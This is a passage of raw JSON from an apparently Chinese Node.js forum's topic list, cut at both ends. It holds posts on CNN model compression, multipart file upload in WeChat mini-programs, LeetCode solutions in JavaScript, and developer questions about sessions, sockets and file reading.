基本思想</h3>\n<p>Distilling直译过来即蒸馏，其基本思想是通过一个性能好的大网络来教小网络学习，从而使得小网络能够具备跟大网络一样的性能，但蒸馏后的小网络参数规模远远小于原始大网络，从而达到压缩网络的目的。</p>\n<p>其中，训练小模型(distilled model)的目标函数由两部分组成</p>\n<ol>\n<li>与大模型(cumbersome model)的softmax输出的交叉熵(cross entropy)，称为软目标(soft target)。其中，softmax的计算加入了超参数温度T，用以控制输出，计算公式变为</li>\n</ol>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044628934_4655_1503044628658.jpg\" alt=\"img\"></p>\n<p>温度T越大，输出的分布越缓和，概率zi/T越小，熵越大，但若T过大，会导致较大熵引起的不确定性增加，增加了不可区分性。</p>\n<p>至于为何要以soft target来计算损失，作者认为，在分类问题中，真值(groundtruth)是一个确定性的，即one-hot vector。以手写数字分类来说，对于一个数字3，它的label是3的概率是1，而是其他数值的概率是0，而对于soft target，它能表征label是3的概率，假如这个数字写的像5，还可以给出label是5的一定概率，从而提供更多信息，如</p>\n<table>\n<thead>\n<tr>\n<th>数字</th>\n<th>0</th>\n<th>1</th>\n<th>2</th>\n<th>3</th>\n<th>4</th>\n<th>5</th>\n<th>6</th>\n<th>7</th>\n<th>8</th>\n<th>9</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>真值</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>软目标</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0.95</td>\n<td>0</td>\n<td>0.048</td>\n<td>0.002</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n</tr>\n</tbody>\n</table>\n<p>2)与真值(groundtruth)的交叉熵(T=1)</p>\n<p>训练的损失为上述两项损失的加权和，通常第二项要小很多。</p>\n<h3>4.2 实验结果</h3>\n<p>作者给出了在语音识别上的实验结果对比，如下表</p>\n<p>表6 蒸馏模型与原始模型精度对比[8]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044808660_8870_1503044808706.jpg\" alt=\"img\"></p>\n<p>上表显示，蒸馏后的模型的精确度和单字错误率和用于产生软目标的10个模型的性能相当，小模型成功地学到了大模型的识别能力。</p>\n<h3>4.3 速度考量</h3>\n<p>Distilling的提出原先并非针对网络加速，而最终计算的效率仍然取决于蒸馏模型的计算规模，但理论上蒸馏后的小模型相对原始大模型的计算速度在一定程度上会有提升，但速度提升的比例和性能维持的权衡是一个值得研究的方向。</p>\n<h2>五、MobileNet</h2>\n<p>MobileNet是由Google提出的针对移动端部署的轻量级网络架构。考虑到移动端计算资源受限以及速度要求严苛，MobileNet引入了传统网络中原先采用的group思想，即限制滤波器的卷积计算只针对特定的group中的输入，从而大大降低了卷积计算量，提升了移动端前向计算的速度。</p>\n<h3>5.1 卷积分解</h3>\n<p>MobileNet借鉴factorized convolution的思想，将普通卷积操作分成两部分：</p>\n<ul>\n<li>Depthwise Convolution 每个卷积核滤波器只针对特定的输入通道进行卷积操作，如下图所示，其中M是输入通道数，DK是卷积核尺寸：</li>\n</ul>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044854699_8557_1503044854460.jpg\" alt=\"img\"></p>\n<p>图7 Depthwise Convolution[9]</p>\n<p>Depthwise convolution的计算复杂度为 DKDKMDFDF，其中DF是卷积层输出的特征图的大小。</p>\n<ul>\n<li>Pointwise Convolution</li>\n</ul>\n<p>采用1x1大小的卷积核将depthwise convolution层的多通道输出进行结合，如下图，其中N是输出通道数：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044898129_8133_1503044897942.jpg\" alt=\"img\"></p>\n<p>图8 Pointwise Convolution[9]</p>\n<p>Pointwise Convolution的计算复杂度为 MNDFDF</p>\n<p>上面两步合称depthwise separable convolution</p>\n<p>标准卷积操作的计算复杂度为DKDKMNDFDF</p>\n<p>因此，通过将标准卷积分解成两层卷积操作，可以计算出理论上的计算效率提升比例：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044971362_8185_1503044971102.jpg\" alt=\"img\"></p>\n<p>对于3x3尺寸的卷积核来说，depthwise separable convolution在理论上能带来约8～9倍的效率提升。</p>\n<h3>5.2 模型架构</h3>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503045019090_5256_1503045018884.jpg\" alt=\"img\"></p>\n<p>图9 普通卷积单元与MobileNet 卷积单元对比[9]</p>\n<p>MobileNet的卷积单元如上图所示，每个卷积操作后都接着一个BN操作和ReLU操作。在MobileNet中，由于3x3卷积核只应用在depthwise convolution中，因此95%的计算量都集中在pointwise convolution 中的1x1卷积中。而对于caffe等采用矩阵运算GEMM实现卷积的深度学习框架，1x1卷积无需进行im2col操作，因此可以直接利用矩阵运算加速库进行快速计算，从而提升了计算效率。</p>\n<h3>5.3 实验结果</h3>\n<p>表7 MobileNet与主流大模型在ImageNet上精度对比[9]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503045056177_4256_1503045055973.jpg\" alt=\"img\"></p>\n<p>上表显示，MobileNet在保证精度不变的同时，能够有效地减少计算操作次数和参数量，使得在移动端实时前向计算成为可能。</p>\n<h2>六、ShuffleNet</h2>\n<p>ShuffleNet是Face++今年提出了一篇用于移动端前向部署的网络架构。ShuffleNet基于MobileNet的group思想，将卷积操作限制到特定的输入通道。而与之不同的是，ShuffleNet将输入的group进行打散，从而保证每个卷积核的感受野能够分散到不同group的输入中，增加了模型的学习能力。</p>\n<h3>6.1 设计思想</h3>\n<p>我们知道，卷积中的group操作能够大大减少卷积操作的计算次数，而这一改动带来了速度增益和性能维持在MobileNet等文章中也得到了验证。然而group操作所带来的另一个问题是：特定的滤波器仅对特定通道的输入进行作用，这就阻碍了通道之间的信息流传递，group数量越多，可以编码的信息就越丰富，但每个group的输入通道数量减少，因此可能造成单个卷积滤波器的退化，在一定程度上削弱了网络了表达能力。</p>\n<h3>6.2 网络架构</h3>\n<p>在此篇工作中，网络架构的设计主要有以下几个创新点：</p>\n<ul>\n<li>提出了一个类似于ResNet的BottleNeck单元</li>\n</ul>\n<p>借鉴ResNet的旁路分支思想，ShuffleNet也引入了类似的网络单元。不同的是，在stride=2的单元中，用concat操作代替了add操作，用average pooling代替了1x1stride=2的卷积操作，有效地减少了计算量和参数。单元结构如图10所示。</p>\n<ul>\n<li>提出将1x1卷积采用group操作会得到更好的分类性能</li>\n</ul>\n<p>在MobileNet中提过，1x1卷积的操作占据了约95%的计算量，所以作者将1x1也更改为group卷积，使得相比MobileNet的计算量大大减少。</p>\n<ul>\n<li>提出了核心的shuffle操作将不同group中的通道进行打散，从而保证不同输入通道之间的信息传递。</li>\n</ul>\n<p>ShuffleNet的shuffle操作如图11所示。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503045098142_9251_1503045097995.jpg\" alt=\"img\"></p>\n<p>图10 ShuffleNet网络单元[10]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503045127753_152_1503045127811.jpg\" alt=\"img\"></p>\n<p>图11 不同group间的shuffle操作[10]</p>\n<h3>6.3 实验结果</h3>\n<p>表8 ShuffleNet与MobileNet在ImageNet上精度对比 [10]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503045150804_9942_1503045150675.jpg\" alt=\"img\"></p>\n<p>上表显示，相对于MobileNet，ShuffleNet的前向计算量不仅有效地得到了减少，而且分类错误率也有明显提升，验证了网络的可行性。</p>\n<h3>6.4 速度考量</h3>\n<p>作者在ARM平台上对网络效率进行了验证，鉴于内存读取和线程调度等因素，作者发现理论上4x的速度提升对应实际部署中约2.6x。作者给出了与原始AlexNet的速度对比，如下表。</p>\n<p>表9 ShuffleNet与AlexNet在ARM平台上速度对比 [10]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503045171960_1003_1503045171776.jpg\" alt=\"img\"></p>\n<h2>结束语</h2>\n<p>近几年来，除了学术界涌现的诸多CNN模型加速工作，工业界各大公司也推出了自己的移动端前向计算框架，如Google的Tensorflow、Facebook的caffe2以及苹果今年刚推出的CoreML。相信结合不断迭代优化的网络架构和不断发展的硬件计算加速技术，未来深度学习在移动端的部署将不会是一个难题。</p>\n<h2>参考文献</h2>\n<p>[1] ImageNet Classification with Deep Convolutional Neural Networks</p>\n<p>[2] Very Deep Convolutional Networks for Large-Scale Image Recognition</p>\n<p>[3] Going Deeper with Convolutions</p>\n<p>[4] Rethinking the Inception Architecture for Computer Vision</p>\n<p>[5] SqueezeNet: AlexNet-level accuracy with 50x fewer parameters and &lt; 0.5MB model size</p>\n<p>[6] Deep Compression: Compressing Deep Neural Networks with Pruning, Trained Quantization and Huffman Coding</p>\n<p>[7] Distilling the Knowledge in a Neural Network</p>\n<p>[8] XNOR-Net: ImageNet Classification Using Binary Convolutional Neural Networks</p>\n<p>[9] MobileNets: Efficient Convolutional Neural Networks for Mobile Vision Applications</p>\n<p>[10] ShuffleNet: An Extremely Efficient Convolutional Neural Network for Mobile Devices</p>\n<p>[11] Network in Network</p>\n<p>[12] EIE: Efficient Inference Engine on Compressed Deep Neural Network</p>\n<p><strong>此文已由作者授权腾讯云+社区在各渠道发布</strong></p>\n<p><strong>获取更多新鲜技术干货，可以关注我们腾讯云技术社区-云加社区官方号</strong></p>\n</div>","title":"CNN 模型压缩与加速算法综述","last_reply_at":"2019-01-04T14:46:13.075Z","good":false,"top":false,"reply_count":2,"visit_count":725,"create_at":"2019-01-02T03:43:59.682Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c2f4cba5bf06c5e7e3f16d0","author_id":"5a59fb3d9d371d4a059eea8c","tab":"share","content":"<div class=\"markdown-text\"><h1>简介</h1>\n<p>小程序官方提供的api <a href=\"https://developers.weixin.qq.com/miniprogram/dev/api/wx.uploadFile.html\">wx.uploadFile</a>一次只能上传一个文件,一般的解决方案是调用多次，但是存在最大并发限制10，<a href=\"https://github.com/supperchong/wx-multipart\">wx-multipart</a>实现了一般的content-type 为 multipart/form-data的post请求。</p>\n<h2>原理</h2>\n<p>对于post请求，小程序官方提供了<a href=\"https://developers.weixin.qq.com/miniprogram/dev/api/wx.request.html\">wx.request</a>和<a href=\"https://developers.weixin.qq.com/miniprogram/dev/api/wx.uploadFile.html\">wx.uploadFile</a>。但是wx.uploadFile一次只能上传一个文件，那可不可以利用wx.request呢？<strong>Yes</strong><br>\n根据官方文档data可以为ArrayBuffer类型，那么只需要解决两个问题。</p>\n<h3>1. 设置content-type为multipart/form-data;</h3>\n<pre class=\"prettyprint language-js\"><code>wx.request({\n\turl,\n\tdata: buffer,\n\theader: {\n\t\t&#x27;content-type&#x27;: &#96;multipart&#x2F;form-data; boundary=${Boundary}&#96;\n\t},\n\tmethod: &#x27;post&#x27;\n})\n</code></pre><h3>2. 将字符串和文件转化为ArrayBuffer</h3>\n<p>首先看下multipart/form-data的数据格式\n<a href=\"https://tools.ietf.org/html/rfc7578\">rfc7578</a></p>\n<pre class=\"prettyprint\"><code>------WebKitFormBoundarycf2702ca043fdf6c4fd42\nContent-Disposition: form-data; name=&quot;number&quot;\n\n13812345678\n------WebKitFormBoundarycf2702ca043fdf6c4fd42\nContent-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.png&quot;\nContent-Type: image&#x2F;png\n\nimageFileData\n------WebKitFormBoundarycf2702ca043fdf6c4fd42--\n</code></pre><p>数据body被Boundary分隔成几部分，Boundary的值为content-type里的boundary。\n每部分包含Content-Disposition，name,filename,换行符\\r\\n,Content-Type和内容<br>\n最后以’–’+Boundary+’–'结尾<br>\n了解了body格式后，很容易根据field的name和value生成相应字符串</p>\n<h4>字符串转化为ArrayBuffer</h4>\n<p>由于js字符串编码格式是utf-16,需要先转化为utf-8,再转化为ArrayBuffer</p>\n<pre class=\"prettyprint language-js\"><code>let strToBuf = function(utf16Str) {\n\tlet utf8Arr = []\n\tlet byteSize = 0\n\tfor (let i = 0; i &lt; utf16Str.length; i++) {\n\t\tlet code = utf16Str.charCodeAt(i)\n\n\t\tif (code &gt;= 0x00 &amp;&amp; code &lt;= 0x7f) {\n\t\t\tbyteSize += 1\n\t\t\tutf8Arr.push(code)\n\t\t} else if (code &gt;= 0x80 &amp;&amp; code &lt;= 0x7ff) {\n\t\t\tbyteSize += 2\n\t\t\tutf8Arr.push(192 | (31 &amp; (code &gt;&gt; 6)))\n\t\t\tutf8Arr.push(128 | (63 &amp; code))\n\t\t} else if (\n\t\t\t(code &gt;= 0x800 &amp;&amp; code &lt;= 0xd7ff) ||\n            (code &gt;= 0xe000 &amp;&amp; code &lt;= 0xffff)\n\t\t) {\n\t\t\tbyteSize += 3\n\t\t\tutf8Arr.push(224 | (15 &amp; (code &gt;&gt; 12)))\n\t\t\tutf8Arr.push(128 | (63 &amp; (code &gt;&gt; 6)))\n\t\t\tutf8Arr.push(128 | (63 &amp; code))\n\t\t} else if (code &gt;= 0x10000 &amp;&amp; code &lt;= 0x10ffff) {\n\t\t\tbyteSize += 4\n\t\t\tutf8Arr.push(240 | (7 &amp; (code &gt;&gt; 18)))\n\t\t\tutf8Arr.push(128 | (63 &amp; (code &gt;&gt; 12)))\n\t\t\tutf8Arr.push(128 | (63 &amp; (code &gt;&gt; 6)))\n\t\t\tutf8Arr.push(128 | (63 &amp; code))\n\t\t}\n\t}\n\tlet arrayBuf = new ArrayBuffer(utf8Arr.length)\n\tlet buf = new Uint8Array(arrayBuf)\n\tfor (let i = 0; i &lt; utf8Arr.length; i++) {\n\t\tbuf[i] = utf8Arr[i]\n\t}\n\treturn buf\n}\n</code></pre><h4>读取文件内容</h4>\n<p>对于文件内容，小程序官方提供了<a href=\"https://developers.weixin.qq.com/miniprogram/dev/api/FileSystemManager.readFile.html\">FileSystemManager.readFile()</a>方法</p>\n<pre class=\"prettyprint language-js\"><code>FileSystemManager.readFile({\n    filePath,&#x2F;&#x2F;要读取的文件的路径 如果不传 encoding，则以 ArrayBuffer 格式读取文件的二进制内容\n    success(res){\n        \n    }\n})\n</code></pre><h4>文件content-type</h4>\n<p>对于文件的content-type 利用库<a href=\"https://github.com/jshttp/mime-types\">mime-types</a>根据文件名获取</p>\n<h1>总结</h1>\n<p><a href=\"https://github.com/supperchong/wx-multipart\">wx-multipart</a> 欢迎star</p>\n</div>","title":"小程序实现真正多文件上传(multipart/form-data)","last_reply_at":"2019-01-04T12:08:26.905Z","good":false,"top":false,"reply_count":0,"visit_count":747,"create_at":"2019-01-04T12:08:26.905Z","author":{"loginname":"supperchong","avatar_url":"https://avatars1.githubusercontent.com/u/26317926?v=4&s=120"}},{"id":"5c2f122a3898674067a7b3b1","author_id":"56daaf5dc0fa23473d005feb","tab":"share","content":"<div class=\"markdown-text\"><h1><a href=\"https://github.com/zhulinwei/leetcode\">leetcode</a></h1>\n<p>leetcode上的算法题目，个人觉得挺有趣的，用JavaScript写完解答后拿出来和大家分享一下，有兴趣的同学也可以给个star，后续会陆续更新…</p>\n<h2>Algorithm</h2>\n<table>\n<thead>\n<tr>\n<th>#</th>\n<th>title</th>\n<th>describe</th>\n<th>difficulty</th>\n<th>completion</th>\n<th>recommend</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/1.two_sum.js\">tow sum</a></td>\n<td>两数之和</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>2</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/2.add_two_numbers.js\">add two numbers</a></td>\n<td>两数相加</td>\n<td>medium</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>7</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/7.reverse_integer.js\">reverse integer</a></td>\n<td>整数反转</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>9</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/9.palindrome_number.js\">palindrome number</a></td>\n<td>回文数</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>14</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/14.longest_common_prefix.js\">longest common prefix</a></td>\n<td>最长公共前缀</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>20</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/20.valid_parentheses.js\">valid parentheses</a></td>\n<td>有效的括号</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>35</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/35.search_insert_position.js\">search insert position</a></td>\n<td>搜索插入位置</td>\n<td>easy</td>\n<td>no</td>\n<td>.</td>\n</tr>\n<tr>\n<td>53</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/53.maximum_subarray.js\">Maximum Subarray</a></td>\n<td>最大子序和</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>66</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/66.plus_one.js\">plus one</a></td>\n<td>加1</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>67</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/67.add_binary.js\">add binary</a></td>\n<td>二进制求和</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>69</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/69.sqrt.js\">sqrtx</a></td>\n<td>x的平方根</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>70</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/70.climbing_stairs.js\">climbing stairs</a></td>\n<td>爬楼梯</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>83</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/83.remove_duplicates_from_sorted_list.js\">remove duplicates from sorted list</a></td>\n<td>删除排序链表中的重复元素</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>94</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/94.binary_tree_inorder_traversal.js\">binary tree inorder traversal</a></td>\n<td>二叉树的中序遍历</td>\n<td>medium</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>101</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/101.symmetric_tree.js\">symmetric tree</a></td>\n<td>对称二叉树</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>104</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/104.maximum_depth_of_binary_tree.js\">maximum depth of binary tree</a></td>\n<td>二叉树的最大深度</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>111</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/111.minimum_depth_of_binary_tree..js\">minimum depth of binary tree</a></td>\n<td>二叉树的最小深度</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>144</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/144.binary_tree_preorder_traversal.js\">binary tree preorder traversal</a></td>\n<td>二叉树的前序遍历</td>\n<td>medium</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>145</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/145.binary_tree_postorder_traversal.js\">binary tree postorder traversal</a></td>\n<td>二叉树的后序遍历</td>\n<td>hard</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>169</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/169.majority_element.js\">majority element</a></td>\n<td>求众数</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>189</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/189.rotate_array.js\">rotate array</a></td>\n<td>旋转数组</td>\n<td>easy</td>\n<td>yes</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>190</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/190.reverse_bits.js\">reverse bits</a></td>\n<td>颠倒二进制位</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>191</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/191.number_of_1_bits.js\">number of 1 bits</a></td>\n<td>位1的个数</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>215</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/215.kth_largest_element_in_an_array.js\">kth largest element in an array</a></td>\n<td>数组中的第K个最大元素</td>\n<td>medium</td>\n<td>no</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>226</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/226.invert_binary_tree.js\">invert binary tree</a></td>\n<td>翻转二叉树</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>257</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/257.binary_tree_paths.js\">binary tree paths</a></td>\n<td>二叉树的所有路径</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>700</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/algorithm/700.search_in_a_binary_search_tree.js\">search in a binary search tree</a></td>\n<td>二叉搜索树中的搜索</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n</tbody>\n</table>\n<h2>Database</h2>\n<table>\n<thead>\n<tr>\n<th>#</th>\n<th>title</th>\n<th>describe</th>\n<th>difficulty</th>\n<th>completion</th>\n<th>recommend</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>175</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/database/175.combine_two_tables.js\">combine two tables</a></td>\n<td>组合两个表</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>176</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/database/176.second_highest_salary.js\">second highest salary</a></td>\n<td>第二高薪</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>181</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/database/181.employees_earning_more_than_their_managers.js\">employees earning more than their managers</a></td>\n<td>超过经理收入的员工</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n<tr>\n<td>183</td>\n<td><a href=\"https://github.com/zhulinwei/leetcode/blob/master/database/183.customers_who_never_order.js\">customers who never order</a></td>\n<td>从不订购的客户</td>\n<td>easy</td>\n<td>yes</td>\n<td>.</td>\n</tr>\n</tbody>\n</table>\n</div>","title":"JavaScript版leetcode部分题目解答","last_reply_at":"2019-01-04T08:00:14.518Z","good":false,"top":false,"reply_count":1,"visit_count":735,"create_at":"2019-01-04T07:58:34.788Z","author":{"loginname":"zhulinwei","avatar_url":"https://avatars2.githubusercontent.com/u/17670262?v=4&s=120"}},{"id":"5c26e75c3898674067a797e4","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>楼主开发经验不长时间,最近有个小项目上线测试,使用PM2集群模式启动项目(之前本机测试一直单机测试,没用PM2),发现用户登录输入了正确的用户名密码之后,还反复跳转登录页面,通过网络查询得知:因为session在集群模式下没有共享才导致这个问题的发生…正好微信公众号的token是用redis缓存的,发现网上有篇文章\n\t&lt;nodejs+express+express-session+redis 实现登陆验证&gt;,内容如下:\nredis.js:</p>\n<p><img src=\"//static.cnodejs.org/Fqz9tfe7tg0D9w988jLx_aBXrZKL\" alt=\"111.jpg\"></p>\n<p>app.js:</p>\n<p><img src=\"//static.cnodejs.org/Fslvz5m9x4xKMvf6DS3ZKGMbiD8E\" alt=\"222.jpg\"></p>\n<p>第一次登陆:</p>\n<p><img src=\"//static.cnodejs.org/FohY11c_I9i6KAy0_3GwIK9vnD7q\" alt=\"333.jpg\"></p>\n<p>需要登陆验证的路由:</p>\n<p><img src=\"//static.cnodejs.org/FoCDD0zXU59l9Zyl2G5q_spGADaP\" alt=\"5555.jpg\"></p>\n<p>麻烦大家帮忙看看,这么配置就可以解决session在集群模式下的正常访问么?根据上面的教程,在使用redis之后,session的使用还是和之前一样用req.session,和我之前想的不一样,之前我以为得自己向redis里写入东西呢!比如 set sessionID XXXX  set USER XXXX,在获取的时候 if(get sessionID XXXX==YYY),是因为引入了\nconst session = require(‘express-session’)这个包,才达到教程里的效果么?</p>\n</div>","title":"请教~node使用redis存储session","last_reply_at":"2019-01-04T03:58:14.297Z","good":false,"top":false,"reply_count":3,"visit_count":1020,"create_at":"2018-12-29T03:17:48.139Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c248f4376c4964062a1e704","author_id":"5bc932c337a6965f59052399","tab":"ask","content":"<div class=\"markdown-text\"><p>请教一个问题，在使用 http.request的 时候偶现 socket hang up，报错如下：\nat createHangUpError (_http_client.js:329:15)\n而且只有在用使用agent的时候会出现，\nagent配置如下：\nopts = {\n\tmaxSockets: 100,\n\tmaxFreeSockets: 10,\n\ttimeout: 10 * 60 * 1000,\n\tkeepAliveTimeout: 30000\n}</p>\n<p>Node版本8.7.0\nagentkeepalive版本 2.2.0</p>\n<p>另外使用官方的agent也会出现这个问题</p>\n</div>","title":"请教一个 socket hang up 的报错问题【已解决】","last_reply_at":"2019-01-04T03:52:26.575Z","good":false,"top":false,"reply_count":10,"visit_count":1225,"create_at":"2018-12-27T08:37:23.029Z","author":{"loginname":"ZhangDianPeng","avatar_url":"https://avatars1.githubusercontent.com/u/18463189?v=4&s=120"}},{"id":"5c2df76f3898674067a7ad20","author_id":"5c2df3e33898674067a7ad0a","tab":"ask","content":"<div class=\"markdown-text\"><p>有个问题像请教论坛里的大佬，我最近在看mdn上express的教程， 感觉按照mvc模型实现这个应用之后，代码的复用性有点差，例如这个项目结构controller里面包含了表单输入的验证和消毒，我觉得不同页面间这些操作都是类似的，有没有别的分层架构可以参考？</p>\n</div>","title":"初学express疑问","last_reply_at":"2019-01-04T03:14:59.506Z","good":false,"top":false,"reply_count":5,"visit_count":698,"create_at":"2019-01-03T11:52:15.384Z","author":{"loginname":"vincentdd","avatar_url":"https://avatars3.githubusercontent.com/u/15828532?v=4&s=120"}},{"id":"5c2747823898674067a79a7c","author_id":"5ad5856c3edb2aff6be85abf","tab":"ask","content":"<div class=\"markdown-text\"><p>假设用户端一直要给我发二进制数据, 发多个, 比如<code>data1</code>, <code>data2</code>, <code>data3</code>,  data不是一个bit, 是个二进制串.\n我现在想将这些数据存在<strong>1个</strong>文件里面, 未来需要读取,并且每次只读取一个data, 我要怎么做.\n我现在的做法是:</p>\n<pre class=\"prettyprint language-js\"><code>bytes += &#x27;\\n&#x27;;\nfs.write(fd, bytes)\n</code></pre><p>给后面加一个标记位, 比如转行.</p>\n<p>但是在读取的时候有没有什么比较好的方法\n现在我想读取的方式是<code>createReadStream</code>, 想每次读取一个byte然后做判断, 如果不是<code>\\n</code>继续读取.</p>\n<ul>\n<li>这样做的话, 对写文件有没有什么要求, 比如必须是按照byte格式写到文件里面?</li>\n<li>如果要读取的话, 怎样按照bite读取?</li>\n<li>有没有其他的方法, 简单的能用就行.</li>\n</ul>\n<p>打开文件之后, 肯定就不会随便关了, 本来想过一次读取多个bite判断, 但是读取多个的话, 如果<code>\\n</code>在多个bite中间的话, 继续下一行读取会丢失一些数据, 这个不做考虑.</p>\n</div>","title":"nodejs关于文件读取","last_reply_at":"2019-01-04T02:53:07.433Z","good":false,"top":false,"reply_count":4,"visit_count":975,"create_at":"2018-12-29T10:08:02.739Z","author":{"loginname":"papandadj","avatar_url":"https://avatars1.githubusercontent.com/u/25424898?v=4&s=120"}},{"id":"5a39d9cdd92f2f5b185ad042","author_id":"5a31e1a6f15b4f306d2f0320","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FpufkDZitM0H3zDF11X5UmvNmkf2\" alt=\"sssssss.png\">；</p>\n<p>看到egg-readyr启动时默认是 master -&gt; app ,master -&gt; agent master -&gt; parent</p>\n<p>master进程还有parent进程吗，如图所示，message里的sendToParent方法process.send master进程向parent进程发送消息。</p>\n<p>但是在master没看到parent进程如何产生的。请教大佬们<br>\n感激！！</p>\n</div>","title":"请问egg源码中 message里为什么还多出一个parent","last_reply_at":"2019-01-04T02:50:04.403Z","good":false,"top":false,"reply_count":8,"visit_count":1536,"create_at":"2017-12-20T03:32:29.274Z","author":{"loginname":"1316346949","avatar_url":"https://avatars1.githubusercontent.com/u/24400797?v=4&s=120"}},{"id":"5c2b4e703898674067a79f90","author_id":"5c2035293898674067a776f2","tab":"ask","content":"<div class=\"markdown-text\"><p>最近在用本站提供的的api做小项目练手，发现验证accesstoken返回给我的老是accesstoken错误（如图）,我的accesstoken可以再手机上登录，所以accesstoken本身应该是对的，可能请求数据哪里没写对，求大神解答<img 